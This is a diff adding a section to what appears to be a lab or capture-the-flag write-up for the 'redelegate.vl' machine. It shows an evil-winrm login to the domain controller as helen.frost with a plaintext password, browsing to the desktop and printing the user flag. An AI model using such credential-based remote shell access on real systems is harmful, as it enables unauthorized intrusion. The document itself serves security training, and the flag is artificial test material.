@@ -516,6 +516,32 @@ Also worth noting this user is part of the remote management users group
 
 ## Evil-winrm as `helen.frost`
 ```python
+evil-winrm -i dc.redelegate.vl -u helen.frost -p 'Password123!'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> dir
 
+
+    Directory: C:\Users\Helen.Frost\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         3/22/2026   8:37 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> type user.txt
+1f50c83f1c03ec3eed5fb4f2ac08990c
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> 
 ```
+I now have an active session on the domain controller
+
+
 
